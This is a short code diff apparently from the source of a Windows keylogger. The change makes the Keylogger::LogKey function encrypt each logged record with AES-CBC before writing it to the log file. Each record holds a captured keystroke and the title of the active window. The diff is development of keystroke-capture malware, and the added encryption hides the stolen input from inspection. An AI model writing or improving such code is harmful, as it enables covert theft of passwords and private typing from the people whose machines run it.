@@ -8,6 +8,7 @@
 #include <map>
 #include <windows.h>
 #include "keylabels.cpp"
+#include "logsEncryption.hpp"
 
 const Config* g_config_ptr = nullptr;
 
@@ -109,7 +110,9 @@ void Keylogger::LogKey(int vkCode) {
         {"key", keyLabel.str()},
         {"window", std::string(windowTitle)}
     };
-    logFile << logEntry.dump() << "\n";
+    // logFile << logEntry.dump() << "\n";
+    std::string encryptedLog = encryptAES_CBC(logEntry.dump());
+    logFile << encryptedLog << "\n";
     logFile.flush();
 }
 
